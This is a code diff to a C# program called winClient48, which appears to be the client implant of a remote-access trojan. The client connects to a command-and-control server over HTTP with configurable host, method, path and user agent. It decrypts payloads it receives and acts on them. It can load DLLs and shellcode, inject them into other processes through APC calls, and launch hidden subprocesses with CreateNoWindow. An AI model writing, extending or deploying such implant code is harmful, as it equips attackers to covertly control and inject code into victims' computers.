@@ -179,6 +179,12 @@ namespace winClient48
         private clsVictim.enProtocol m_protocol =            //C2 Protocol
             (clsVictim.enProtocol)Enum.Parse(typeof(clsVictim.enProtocol), "[PROTOCOL]");
 
+        //HTTP
+        private string m_szHost = "[HTTP_HOST]";
+        private string m_szMethod = "[HTTP_METHOD]";
+        private string m_szPath = "[HTTP_PATH]";
+        private string m_szUA = "[HTTP_UA]";
+
         private ClientConfig clntConfig;                     //Client configuration
 
         //PAYLOAD
@@ -514,7 +520,6 @@ namespace winClient48
                 byte[] static_recvBuf = new byte[clsVictim.MAX_BUFFER_LENGTH];
                 byte[] dynamic_recvBuf = new byte[] { };
 
-                victim.m_protocol = clsVictim.enProtocol.HTTP;
                 victim.fnHttpSend(1, 0, clsEZData.fnGenerateRandomStr());
 
                 do
@@ -597,7 +602,8 @@ namespace winClient48
                                 {
                                     string payload = Encoding.UTF8.GetString(dsp.GetMsg().msg);
                                     payload = clsCrypto.AESDecrypt(Convert.FromBase64String(payload), victim._AES.key, victim._AES.iv);
-                                    _Received(victim, payload);
+
+                                    Task.Run(() => _Received(victim, payload));
                                 }
                                 catch
                                 {
@@ -611,7 +617,7 @@ namespace winClient48
                         }
                     }
                 }
-                while (recv_len > 0);
+                while (recv_len > 0 && is_connected);
             }
             catch (Exception ex)
             {
@@ -2435,7 +2441,17 @@ namespace winClient48
                         switch (nMethod)
                         {
                             case -1:
-                                ret = loader.fnLdrLoadDll(abDllBytes);
+                                var psi = new ProcessStartInfo
+                                {
+                                    FileName = Process.GetCurrentProcess().MainModule.FileName,
+                                    Arguments = $"--dll {cmd[5]}",
+                                    UseShellExecute = false,
+                                    RedirectStandardOutput = true,
+                                    CreateNoWindow = true,
+                                };
+
+                                Process.Start(psi);
+                                ret.szMsg = "Subprocess is started, please check.";
                                 break;
                             case 0:
                                 ret = loader.fnApcDLL(nProcId, abDllBytes);
@@ -2473,7 +2489,17 @@ namespace winClient48
                         switch (nMethod)
                         {
                             case -1:
-                                ret = loader.fnShellCodeLoader(abShellcode);
+                                var psi = new ProcessStartInfo
+                                {
+                                    FileName = Process.GetCurrentProcess().MainModule.FileName,
+                                    Arguments = $"--sc {cmd[4]}",
+                                    UseShellExecute = false,
+                                    RedirectStandardOutput = true,
+                                    CreateNoWindow = true,
+                                };
+
+                                Process.Start(psi);
+                                ret.szMsg = "Subprocess is started, please check.";
                                 break;
                             case 0:
                                 ret = loader.fnApcSC(nProcId, abShellcode);
@@ -3000,8 +3026,7 @@ namespace winClient48
                     TcpClient client = new TcpClient();
                     client.Connect(ip, port);
 
-                    clsVictim victim = new clsVictim(client.Client);
-                    victim.m_protocol = clsVictim.enProtocol.HTTP;
+                    clsVictim victim = new clsVictim(client.Client, m_szHost, m_szMethod, m_szPath, m_szUA);
 
                     new Thread(() => fnHttpRecv(victim)).Start();
                 }
